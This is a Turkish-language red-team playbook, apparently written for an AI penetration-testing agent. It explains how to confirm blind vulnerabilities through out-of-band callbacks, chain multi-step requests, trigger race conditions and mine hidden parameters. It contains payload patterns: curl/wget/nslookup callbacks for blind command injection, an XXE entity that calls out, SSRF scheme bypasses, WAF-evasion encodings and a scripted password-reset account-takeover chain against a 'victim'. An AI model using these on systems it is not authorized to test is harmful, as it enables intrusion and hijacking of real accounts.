# Red-Team Primitifleri — kör/çok-adımlı/eşzamanlı/gizli yüzey

> Bu sözleşme, açık bulmada en çok kaçırılan dört sınıfı **motorun yeni araçlarıyla**
> gerçekten test edilebilir kılar: kör (blind/OOB) zafiyetler, çok-adımlı (stateful)
> zincirler, eşzamanlılık (TOCTOU) yarışları ve gizli (hidden) parametre/yüzey keşfi.
> "Yanıt boş, devam edemem" / "elle zincir kuramadım" / "yarış pencere açamadım" /
> "yeni endpoint yok" demeden ÖNCE buradaki primitifi kullan.
> İlişkili: [[out-of-band-testing]] [[oob-blind-confirmation]] [[chain-attack-builder]]
> [[vuln-race-condition]] [[vuln-ssrf]] [[vuln-idor]] [[vuln-mass-assignment]] [[evidence-discipline]]

---

## 1. KÖR ZAFİYET → `cyp_oob_register` + `cyp_oob_poll` (out-of-band kanıt)

Yanıt gövdesi HİÇBİR ŞEY göstermediğinde (blind SSRF, out-of-band RCE, kör XXE/SQLi
exfil, ikinci-sıra injection) kanıt **dışarıdan geri-çağrıdır**. Cypture'ın kendi
collaborator'ı vardır:

1. `cyp_oob_register{label:"ssrf-imageproxy"}` → `{token, http_url, dns_host}` döner.
2. `http_url` (veya `dns_host`) değerini şüpheli sink'e enjekte et:
   - **SSRF:** `url=`, `image=`, `webhook=`, `callback=` parametresine `http_url`.
   - **RCE (kör):** komuta `curl http_url` / `nslookup dns_host` / `wget http_url`.
   - **XXE:** harici entity `<!ENTITY x SYSTEM "http_url">` + `&x;`.
   - **İkinci-sıra:** kayıt/yorum/profil alanına koy; backend sonradan render eder.
3. `cyp_oob_poll{token}` → `confirmed:true` ve `interactions[]` (zaman/kaynak-IP/path)
   gelirse **kör açık KANITLANDI** (verified:true — hedef senin kontrol ettiğin host'a ulaştı).
4. Hit yoksa: payload'ı varyantla (encoding, şema `http://`→`gopher://`/`dict://`, IP-literal,
   `@`-bypass) ve tekrar enjekte+poll. Birkaç tur sonra hit yoksa "kör kanal yok" diye işaretle.

> Erişilebilirlik: hedefin geri-çağrı host'una ulaşabilmesi gerekir. `http_url`'i
> olduğu gibi kullan — backend onu publicly-reachable adrese ayarlar (CYP_OOB_URL).
> İç-ağ SSRF'de (cloud metadata vb.) hedef ile motor aynı ağda olduğundan zaten çalışır.

### 1b. E-POSTA/OTP AKIŞLARI → reset/2FA/magic-link → HESAP ELE GEÇİRME

`cyp_oob_register` ayrıca bir `email` (`<token>@oob-domain`) döndürür. Bunu **kurbanın
gelen kutusu** olarak kullan: kayıt / parola-sıfırlama / 2FA akışında bu adresi gir. Sonra
`cyp_oob_poll{token}`:
- `email_links` → reset/verify/magic-link URL'leri (hazır çıkarılmış).
- `email_codes` → 4–8 haneli OTP/2FA kodları (hazır çıkarılmış).

Tipik zincir (bunu `cyp_sequence` ile otomatikleştir):
1. `email` ile parola-sıfırlama tetikle (POST /forgot).
2. `cyp_oob_poll` → gelen reset-link'ten token'ı al.
3. `cyp_sequence` ile reset-link token'ını kullanarak parolayı değiştir → giriş → **ATO**.
2FA için: login → OTP istenir → `email_codes`'tan kodu al → gir. Magic-link login aynı.

> Erişilebilirlik: OOB domain'inin **MX kaydı** SMTP catch-all'a (CYP_OOB_SMTP_ADDR, port 25)
> işaret etmeli. Yoksa `email` yakalanmaz — operatör test-kimliği verdiyse onu kullan.

---

## 2. ÇOK-ADIMLI ZİNCİR → `cyp_sequence` (stateful, değer taşıyan)

Tek istekle ifade edilemeyen exploit'ler: CSRF-token-al-sonra-gönder, login-sonra-eylem,
**IDOR→şifre-sıfırlama→hesap ele geçirme**, "A yanıtından id/token oku, B isteğinde kullan".
Elle kopyala-yapıştır YAPMA; bir adımda takılıp zinciri bırakma — motor taşır:

```
cyp_sequence{steps:[
  {name:"login",  raw:"POST /login ...",          extract:[{var:"csrf", from:"body", json:"data.csrf"}]},
  {name:"reset",  raw:"POST /reset?u=victim ...",  extract:[{var:"rtok", from:"body", regex:"token=([a-f0-9]+)"}]},
  {name:"takeover", raw:"POST /reset/confirm  ...  token={{rtok}}&new=Pwn123!"}
]}
```

- `{{var}}` yer-tutucuları sonraki adımların `raw`/`host`'unda değerle değişir.
- `extract.from`: `body` | `header:Set-Cookie` | `status` | `location` | `requestId`.
- `extract`: `json` (noktalı yol: `data.items.0.id`) **veya** `regex` (1. yakalama grubu).
- Dönüş: her adımın `status`/`requestId`/`extracted` + son `vars`. Adım hata verirse
  zincir o noktada durur (`stopped_at`) — neden durduğunu görür, varyantlarsın.

IDOR'da iki kimlik için: A ile oku (`extract` ile id'leri topla) → B kimliğiyle aynı
id'lere eriş; `cyp_diff_requests` ile A-vs-B sapmasını kanıtla.

---

## 3. EŞZAMANLILIK / TOCTOU → `cyp_race_send` (= `cyp_race_window_send`)

Kontrol→kullan penceresine **aynı anda** çarpan açıklar (kupon/hediye-kartı çift-kullanım,
bakiye çift-çekim, çift-oy, hesap-başına-bir limiti aşma, davet/kayıt yarışı). `cyp_batch_send`
**senkron değildir** — istekler dağınık varır, yarışı kaçırır. Bunun yerine:

```
cyp_race_send{host:"...", raw:"POST /coupon/redeem ... code=ONCE", count:20}
# veya farklı yükler:
cyp_race_send{host:"...", requests:[{label:"buy",raw:"..."},{label:"refund",raw:"..."}]}
```

- Her istek **ayrı bağlantıda** kurulur, son byte hariç yazılır, sonra hepsinin son byte'ı
  **birlikte** salınır → pencere ~sub-ms'ye iner (`fireOffsetNs` gerçek dağılımı gösterir).
- Yarış var ⇔ sonuç sıralı çalıştırmadan FARKLI (ör. tek-kullanımlık kodun iki kez 200-OK
  redeem'i, limitin iki kez aşılması). Önce `count:1` baseline, sonra `count:10..20` kıyas.
- Kanıt: birden çok başarılı yanıt + sunucu-tarafı durum (iki kayıt, çift bakiye). verified:true.

---

## 4. GİZLİ YÜZEY → `cyp_param_mine` + KEŞİF GENİŞLİĞİ

Crawling'in göstermediği en verimli açık kaynağı **gizli/undocumented parametrelerdir**.
Bir istekte (id) aday parametre listesini dene:

```
cyp_param_mine{id:"req_42", params:["debug","admin","is_admin","role","user_id","account",
  "redirect","next","url","callback","include","file","template","preview","draft","internal"]}
```

- Her aday canary değerle eklenir, yanıt baseline'a diff'lenir; status/uzunluk değişen ya da
  canary'i yansıtan parametreler **CANDIDATE** olarak döner — sonra elle doğrula:
  `redirect/next/url` → open-redirect/SSRF; `role/is_admin/account/user_id` → mass-assignment/IDOR;
  `debug/internal/preview` → bilgi ifşası/yetki atlatma.

**Keşif genişliği (param_mine'dan önce, recon ZORUNLULUĞU):** yüzeyi GET'le sınırlama.
- **Metot çeşitliliği:** her endpoint'i sadece GET değil; POST/PUT/PATCH/DELETE dene —
  yazma metotları mass-assignment/BFLA'nın ana yeridir. `OPTIONS`/`405` izinli metotları açar.
- **Gövde parametreleri:** JSON/form gövdesindeki alanları çıkar; gövdeye de gizli alan ekle
  (`cyp_replay_request set_params` ya da elle `{"role":"admin"}`).
- **JS route/endpoint çıkarımı:** SPA'da ham HTML iskelet dönüyorsa `cyp_browser_navigate` +
  `cyp_browser_eval` ile JS bundle'larındaki API path/route'ları topla (sadece DOM-XSS için değil).

---

## 5. PAYLOAD'I GERİ-BESLEMEYLE EVRİMLEŞTİR (WAF/filtre)

Statik liste deneyip "engellendi, açık yok" deme. Sinyali OKU, payload'ı ona göre türet:
- Gönder → `cyp_reflect` ile çıkış-bağlamını (html-text/attr/js/json/header) ve **neyin
  encode/strip edildiğini** öğren → bağlamı kıran varyantı seç (attr-breakout, js-string-kapatma,
  alternatif encoding: çift-URL/unicode/overlong, yorum-stili `/**/`/`--+`/`#`).
- 403/WAF blok ⇒ açık-yok DEĞİL ⇒ eksen değiştir: case, boşluk→`/**/`, parça-anahtar-kelime,
  alternatif serializer (JSON/GraphQL), başlık/parametre kirliliği (HPP). Bkz. [[attacker-mindset-and-persistence]].

---

## 6. KAPSAMA KAPISI — erken bitirme YASAK

"Birkaç test yaptım, yeter" deme. Bir host/endpoint için, uygulanabilir HER zafiyet sınıfında
ya **kanıt** ya **gerekçeli yok** üret (BİLİNMİYOR bırakma). Kör/çok-adımlı/yarış/gizli-param
dört primitifini de değerlendirmeden o yüzeyi "tamam" sayma. Bkz. [[depth-calibration]]
[[coverage-status]] mantığı: matris dolmadan dalga kapanmaz.

---

## 7. BULGU KAYDI — ÇİFT KANAL (panele düşmeyen bulgu = bulunmamış bulgu)

En sık kayıp: bulguyu BULURSUN ama panele DÜŞMEZ — `cyp_create_finding`'i çağırmayı
unutup düz cümleyle "SQLi buldum" dersin. Cümle hiçbir yere kaydedilmez. Her DOĞRULANMIŞ
bulgu için **İKİSİNİ de** yap:

1. `cyp_create_finding{...}` (birincil kanal), **VE**
2. Çıktına o anda **tek satır** şu işareti yaz:
   `[CYP-FINDING]{"title":"...","severity":"high","vuln_type":"...","endpoint":"...","poc":"...","cvss":"...","confidence":"confirmed","verified":true}`

İşaret (2) bir yedektir: araç çağrısını atlasan/halüsine etsen bile backend o satırı yapısal
bulguya çevirir (başlığa göre dedup → ikisi gelse tek düşer). Bulguyu **anında** kaydet —
sona bırakma, tarama yarıda kesilirse kaybolur. "Buldum" demek ≠ kaydetmek.

---

## 8. ÖĞRENİLMİŞ ÖNSELLER — geçmiş angajmanların hafızası (sıfırdan başlama)

`/cyp/kb.json` içinde `learned_priors` varsa: bu, **çapraz-angajman** öğrenilmiş, genelleştirilmiş
bir tablodur — "şu tech stack'inde geçmişte en çok hangi sınıf doğrulandı" (rate=doğrulama oranı).
Recon tech'i tespit edince (`learned_priors[<tech>]`): **yüksek-rate sınıfları ÖNCE ve daha DERİN**
test et (zaman/token'ı oraya yatır). Bu hedef verisi değil, istatistiksel önseldir — düşük-rate'i
"atla" diye OKUMA, sadece sıralama ipucu. Bulduğun her doğrulanmış sınıf, bu hafızayı bir sonraki
angajman için büyütür (Harvest otomatik).
